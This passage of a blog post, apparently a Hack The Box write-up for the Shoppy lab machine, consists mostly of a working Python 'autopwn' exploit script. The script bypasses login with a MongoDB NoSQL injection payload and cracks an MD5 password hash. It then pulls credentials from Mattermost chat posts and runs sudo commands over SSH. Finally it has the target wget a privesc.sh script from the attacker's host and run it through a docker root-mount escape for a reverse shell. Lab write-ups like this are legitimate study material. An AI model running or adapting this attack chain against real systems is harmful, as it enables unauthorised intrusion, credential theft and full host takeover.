<span class="c1"># ctrl + c
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User terminated.'</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># make get/post request
</span><span class="k">def</span> <span class="nf">make_request</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">target_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">json_data</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
	<span class="n">response</span> <span class="o">=</span> <span class="s">''</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">method</span> <span class="o">==</span> <span class="s">'get'</span><span class="p">:</span>
			<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">method</span> <span class="o">==</span> <span class="s">'post'</span><span class="p">:</span>
			<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">response</span>

<span class="c1"># read wordlist file
</span><span class="k">def</span> <span class="nf">get_wordlist</span><span class="p">():</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist_filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'replace'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span> <span class="c1"># errors='replace' (UnicodeDecodeError)
</span>		<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
	<span class="k">return</span> <span class="n">wordlist</span>

<span class="c1"># convert password to hash (md5)
</span><span class="k">def</span> <span class="nf">to_hash</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
	<span class="n">password_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
	<span class="k">return</span> <span class="n">password_hash</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># crack password hash
</span><span class="k">def</span> <span class="nf">cracking_password</span><span class="p">(</span><span class="n">password_hash</span><span class="p">,</span> <span class="n">wordlist</span><span class="o">=</span><span class="n">get_wordlist</span><span class="p">()):</span>
	<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
		<span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">to_hash</span><span class="p">(</span><span class="n">word</span><span class="p">)</span> <span class="o">==</span> <span class="n">password_hash</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">word</span>

<span class="c1"># connect via ssh and run commands
</span><span class="k">def</span> <span class="nf">ssh_exec_commands_like</span><span class="p">(</span><span class="n">ssh_username</span><span class="p">,</span> <span class="n">ssh_password</span><span class="p">,</span> <span class="n">commands</span><span class="p">):</span>
	<span class="n">_stdout_commands</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHClient</span><span class="p">()</span>
		<span class="n">client</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
		<span class="n">client</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">ssh_username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">ssh_password</span><span class="p">)</span>

		<span class="k">for</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">commands</span><span class="p">:</span>
			<span class="n">_stdout</span> <span class="o">=</span> <span class="s">''</span>
			<span class="k">if</span> <span class="s">'sudo'</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
				<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">get_pty</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
				<span class="n">_stdin</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">ssh_password</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
				<span class="n">_stdin</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">get_pty</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
			<span class="n">_stdout_commands</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">_stdout</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
		
		<span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>
	
	<span class="k">return</span> <span class="n">_stdout_commands</span>

<span class="c1"># bypass login to shoppy.htb (Mongo NoSQLi) and return Josh password hash
</span><span class="k">def</span> <span class="nf">get_josh_password_hash</span><span class="p">():</span>
	<span class="n">josh_password_hash</span> <span class="o">=</span> <span class="s">''</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
		
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Bypass login'</span><span class="p">)</span>

		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/json'</span><span class="p">}</span>
		<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"username"</span> <span class="p">:</span> <span class="s">"admin'||' 1==1"</span><span class="p">,</span>
			<span class="s">"password"</span> <span class="p">:</span> <span class="s">""</span>
		<span class="p">}</span>

		<span class="n">_</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'post'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="s">'http://shoppy.htb/login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json_data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
		<span class="n">cookies</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()</span>
		
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Extract password'</span><span class="p">)</span>

		<span class="n">_</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'get'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="s">'http://shoppy.htb/admin/search-users?username=josh'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
		<span class="n">response</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'get'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="s">'http://shoppy.htb/exports/export-search.json'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
		<span class="n">josh_password_hash</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="s">'password'</span><span class="p">]</span>
				
		<span class="n">session</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">josh_password_hash</span>

<span class="c1"># login mattermost.shoppy.htb (Josh credentials) and return credentials from user Jaeger
</span><span class="k">def</span> <span class="nf">get_jaeger_credentials</span><span class="p">(</span><span class="n">josh_password_text</span><span class="p">):</span>
	<span class="n">deploy_machine_username</span> <span class="o">=</span> <span class="s">''</span>
	<span class="n">deploy_machine_password</span> <span class="o">=</span> <span class="s">''</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
		
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Persistent login to mattermost API'</span><span class="p">)</span>

		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span> <span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
		<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"login_id"</span> <span class="p">:</span> <span class="s">"josh"</span><span class="p">,</span>
			<span class="s">"password"</span> <span class="p">:</span> <span class="s">"{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">josh_password_text</span><span class="p">)</span>
		<span class="p">}</span>

		<span class="n">response</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'post'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="s">'http://mattermost.shoppy.htb/api/v4/users/login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json_data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
		<span class="n">user_mfa_token</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Token'</span><span class="p">]</span>
		<span class="n">user_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'id'</span><span class="p">]</span>

		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Authorization"</span> <span class="p">:</span> <span class="s">"Bearer {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">user_mfa_token</span><span class="p">)}</span>

		<span class="n">response</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'get'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="sa">f</span><span class="s">'http://mattermost.shoppy.htb/api/v4/users/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s">/teams'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
		<span class="n">user_teams_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="s">'id'</span><span class="p">]</span>

		<span class="n">response</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'get'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="sa">f</span><span class="s">'http://mattermost.shoppy.htb/api/v4/teams/</span><span class="si">{</span><span class="n">user_teams_id</span><span class="si">}</span><span class="s">/channels/name/deploy-machine'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
		<span class="n">deploy_machine_channel_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'id'</span><span class="p">]</span>
		
		<span class="n">response</span> <span class="o">=</span> <span class="n">make_request</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'get'</span><span class="p">,</span> <span class="n">target_url</span><span class="o">=</span><span class="sa">f</span><span class="s">'http://mattermost.shoppy.htb/api/v4/channels/</span><span class="si">{</span><span class="n">deploy_machine_channel_id</span><span class="si">}</span><span class="s">/posts'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
		<span class="n">deploy_machine_username</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'posts'</span><span class="p">][</span><span class="s">'ki1a198dybd7icutcjsa1ut6iy'</span><span class="p">][</span><span class="s">'message'</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">16</span><span class="p">]</span>
		<span class="n">deploy_machine_password</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'posts'</span><span class="p">][</span><span class="s">'ki1a198dybd7icutcjsa1ut6iy'</span><span class="p">][</span><span class="s">'message'</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">18</span><span class="p">]</span>

		<span class="n">session</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">deploy_machine_username</span><span class="p">,</span> <span class="n">deploy_machine_password</span>

<span class="c1"># ssh login (jaeger user) and return credentials from user Deploy
</span><span class="k">def</span> <span class="nf">get_deploy_user_credentials</span><span class="p">(</span><span class="n">deploy_machine_username</span><span class="p">,</span> <span class="n">deploy_machine_password</span><span class="p">):</span>
	<span class="n">ssh_commands_response</span> <span class="o">=</span> <span class="n">ssh_exec_commands_like</span><span class="p">(</span>
		<span class="n">deploy_machine_username</span><span class="p">,</span> <span class="n">deploy_machine_password</span><span class="p">,</span> 
		<span class="p">[</span><span class="s">'sudo -l'</span><span class="p">,</span> <span class="s">'sudo -u deploy /home/deploy/password-manager &lt;&lt;&lt; "Sample"'</span><span class="p">])</span>

	<span class="n">deploy_user_username</span> <span class="o">=</span> <span class="n">ssh_commands_response</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
	<span class="n">deploy_user_password</span> <span class="o">=</span> <span class="n">ssh_commands_response</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>

	<span class="k">return</span> <span class="n">deploy_user_username</span><span class="p">,</span> <span class="n">deploy_user_password</span>

<span class="c1"># ssh login (deploy user) and get shell
</span><span class="k">def</span> <span class="nf">interactive_shell</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">deploy_user_username</span><span class="p">,</span> <span class="n">deploy_user_password</span><span class="p">):</span>
	<span class="n">init_server</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'/usr/bin/python3 -m http.server </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">'</span>
	<span class="n">server_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">init_server</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Cron process file uploaded'</span><span class="p">)</span>

	<span class="n">ssh_commands_response</span> <span class="o">=</span> <span class="n">ssh_exec_commands_like</span><span class="p">(</span><span class="n">deploy_user_username</span><span class="p">,</span> <span class="n">deploy_user_password</span><span class="p">,</span> 
		<span class="p">[</span><span class="sa">f</span><span class="s">'wget http://</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">/privesc.sh -O /tmp/privesc.sh'</span><span class="p">,</span> 
		<span class="s">'chmod +x /tmp/privesc.sh'</span><span class="p">,</span> 
		<span class="sa">f</span><span class="s">'docker run -it -v /:/tmp --rm alpine sh /tmp/tmp/privesc.sh </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">])</span>
	
	<span class="n">server_process</span><span class="p">.</span><span class="n">kill</span><span class="p">();</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

	<span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
	
	<span class="k">if</span> <span class="n">shell</span><span class="p">.</span><span class="n">sock</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Press Ctrl + D to exit'</span><span class="p">)</span>
		<span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># exploitation process
</span><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
	<span class="n">process</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting attack'</span><span class="p">)</span>

	<span class="c1"># (1) bypass login to shoppy.htb (Mongo NoSQLi), extract Josh password hash and crack it
</span>	<span class="n">process</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting and Cracking Josh password hash'</span><span class="p">)</span>
	<span class="n">josh_password_text</span> <span class="o">=</span> <span class="n">cracking_password</span><span class="p">(</span><span class="n">password_hash</span><span class="o">=</span><span class="n">get_josh_password_hash</span><span class="p">())</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'Cracked password: </span><span class="si">{</span><span class="n">josh_password_text</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


	<span class="c1"># (2) login mattermost.shoppy.htb (Josh credentials) extract the Jaeger credentials for the Deploy machine
</span>	<span class="n">process</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting the Jaeger credentials for the Deploy machine'</span><span class="p">)</span>
	<span class="n">deploy_machine_username</span><span class="p">,</span> <span class="n">deploy_machine_password</span> <span class="o">=</span> <span class="n">get_jaeger_credentials</span><span class="p">(</span><span class="n">josh_password_text</span><span class="p">)</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'Credentials obtained: </span><span class="si">{</span><span class="n">deploy_machine_username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">deploy_machine_password</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


	<span class="c1"># (3) ssh login (jaeger user), privileges for specific command and binary reverse engineering (get credentials)
</span>	<span class="n">process</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting the Jaeger credentials for the Deploy machine'</span><span class="p">)</span>
	<span class="n">deploy_user_username</span><span class="p">,</span> <span class="n">deploy_user_password</span> <span class="o">=</span> <span class="n">get_deploy_user_credentials</span><span class="p">(</span><span class="n">deploy_machine_username</span><span class="p">,</span> <span class="n">deploy_machine_password</span><span class="p">)</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'Credentials obtained: </span><span class="si">{</span><span class="n">deploy_user_username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">deploy_user_password</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


	<span class="c1"># (4) ssh login (deploy user) and mount root system with docker socket to execute reverse shell
</span>	<span class="n">process</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Abusing docker group membership to run privileged commands'</span><span class="p">)</span>
	<span class="n">interactive_shell</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">deploy_user_username</span><span class="p">,</span> <span class="n">deploy_user_password</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
		<span class="n">description</span><span class="o">=</span><span class="s">'Autopwn Shoppy HTB Machine'</span><span class="p">,</span>
		<span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
		<span class="n">epilog</span><span class="o">=</span><span class="s">"""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		"""</span><span class="p">)</span>

	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specified IP to receive the shell'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specified PORT to receive the shell'</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="n">run</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

<span class="c1"># References:
#------------
# https://api.mattermost.com/#tag/authentication
</span></pre></table></code></div></div><p><img data-src="/assets/img/htb/writeups/shoppy/autopwn_run.png" alt="autopwn-run" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Shoppy">https://github.com/E1P0TR0</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/nosqli/" class="post-tag no-text-decoration" >NoSQLI</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >Reverse Engineering</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >Docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Shoppy - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBShoppy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Shoppy - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBShoppy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBShoppy/&amp;text=Hackthebox Writeup Shoppy - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno 